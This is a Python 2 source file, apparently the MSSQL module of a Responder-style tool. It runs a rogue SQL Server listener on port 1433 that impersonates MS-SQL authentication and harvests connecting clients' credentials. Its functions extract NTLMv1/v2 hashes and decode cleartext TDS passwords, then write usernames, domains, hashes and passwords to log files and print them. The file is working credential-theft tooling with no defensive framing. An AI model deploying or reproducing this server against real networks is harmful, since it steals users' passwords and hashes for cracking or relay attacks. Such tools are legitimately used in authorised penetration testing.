import struct

class MSSQLServer():

	def serve_thread_tcp(host, port, handler):
		try:
			server = ThreadingTCPServer((host, port), handler)
			server.serve_forever()
		except Exception, e:
			print "Error starting TCP server on port %s: %s:" % (str(port),str(e))

	def start(SQL_On_Off):
		if SQL_On_Off == "ON":
			t = threading.Thread(name="MSSQL", target=self.serve_thread_tcp, args=("0.0.0.0", 1433,MSSQL))
			t.setDaemon(True)
			t.start()
			return t
		if SQL_On_Off == "OFF":
			return False

class ThreadingTCPServer(ThreadingMixIn, TCPServer):

	allow_reuse_address = True

	def server_bind(self):
		TCPServer.server_bind(self)

#This function parse SQL NTLMv1/v2 hash and dump it into a specific file.
def ParseSQLHash(data,client):
	SSPIStart = data[8:]
	LMhashLen = struct.unpack('<H',data[20:22])[0]
	LMhashOffset = struct.unpack('<H',data[24:26])[0]
	LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()
	NthashLen = struct.unpack('<H',data[30:32])[0]
	if NthashLen == 24:
		NthashOffset = struct.unpack('<H',data[32:34])[0]
		NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainLen = struct.unpack('<H',data[36:38])[0]
		DomainOffset = struct.unpack('<H',data[40:42])[0]
		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[44:46])[0]
		UserOffset = struct.unpack('<H',data[48:50])[0]
		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		outfile = "./logs/responder/MSSQL-NTLMv1-Client-"+client+".txt"
		WriteData(outfile,User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal, User+"::"+Domain)
		responder_logger.info('[+]MsSQL NTLMv1 hash captured from :%s'%(client))
		responder_logger.info('[+]MSSQL NTLMv1 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
		responder_logger.info('[+]MSSQL NTLMv1 Domain is :%s'%(Domain))
		responder_logger.info('[+]MSSQL NTLMv1 Complete hash is: %s'%(User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal))
	if NthashLen > 60:
		DomainLen = struct.unpack('<H',data[36:38])[0]
		NthashOffset = struct.unpack('<H',data[32:34])[0]
		NthashLen = struct.unpack('<H',data[30:32])[0]
		Hash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()
		DomainOffset = struct.unpack('<H',data[40:42])[0]
		Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00','')
		UserLen = struct.unpack('<H',data[44:46])[0]
		UserOffset = struct.unpack('<H',data[48:50])[0]
		User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
		outfile = "./logs/responder/MSSQL-NTLMv2-Client-"+client+".txt"
		Writehash = User+"::"+Domain+":"+NumChal+":"+Hash[:32].upper()+":"+Hash[32:].upper()
		WriteData(outfile,Writehash,User+"::"+Domain)
		responder_logger.info('[+]MsSQL NTLMv2 hash captured from :%s'%(client))
		responder_logger.info('[+]MSSQL NTLMv2 Domain is :%s'%(Domain))
		responder_logger.info('[+]MSSQL NTLMv2 User is :%s'%(SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')))
		responder_logger.info('[+]MSSQL NTLMv2 Complete Hash is : %s'%(Writehash))

def ParseSqlClearTxtPwd(Pwd):
	Pwd = map(ord,Pwd.replace('\xa5',''))
	Pw = []
	for x in Pwd:
		Pw.append(hex(x ^ 0xa5)[::-1][:2].replace("x","0").decode('hex'))
	return ''.join(Pw)

def ParseClearTextSQLPass(Data,client):
	outfile = "./logs/responder/MSSQL-PlainText-Password-"+client+".txt"
	UsernameOffset = struct.unpack('<h',Data[48:50])[0]
	PwdOffset = struct.unpack('<h',Data[52:54])[0]
	AppOffset = struct.unpack('<h',Data[56:58])[0]
	PwdLen = AppOffset-PwdOffset
	UsernameLen = PwdOffset-UsernameOffset
	PwdStr = ParseSqlClearTxtPwd(Data[8+PwdOffset:8+PwdOffset+PwdLen])
	UserName = Data[8+UsernameOffset:8+UsernameOffset+UsernameLen].decode('utf-16le')
	WriteData(outfile,UserName+":"+PwdStr,UserName+":"+PwdStr)
	responder_logger.info('[+]MSSQL PlainText Password captured from :%s'%(client))
	responder_logger.info('[+]MSSQL Username: %s Password: %s'%(UserName, PwdStr))


def ParsePreLoginEncValue(Data):
	PacketLen = struct.unpack('>H',Data[2:4])[0]
	EncryptionValue = Data[PacketLen-7:PacketLen-6]
	if re.search("NTLMSSP",Data):
		return True
	else:
		return False

#MS-SQL server class.
class MSSQL(BaseRequestHandler):

	def handle(self):
		try:
			while True:
				data = self.request.recv(1024)
				self.request.settimeout(0.1)
				##Pre-Login Message
				if data[0] == "\x12":
					buffer0 = str(MSSQLPreLoginAnswer())
					self.request.send(buffer0)
					data = self.request.recv(1024)
				##NegoSSP
				if data[0] == "\x10":
					if re.search("NTLMSSP",data):
						t = MSSQLNTLMChallengeAnswer(ServerChallenge=Challenge)
						t.calculate()
						buffer1 = str(t)
						self.request.send(buffer1)
						data = self.request.recv(1024)
					else:
						ParseClearTextSQLPass(data,self.client_address[0])
					##NegoSSP Auth
				if data[0] == "\x11":
					ParseSQLHash(data,self.client_address[0])
		except Exception:
			pass
			self.request.close()
##################################################################################
#SQL Stuff ends here
##################################################################################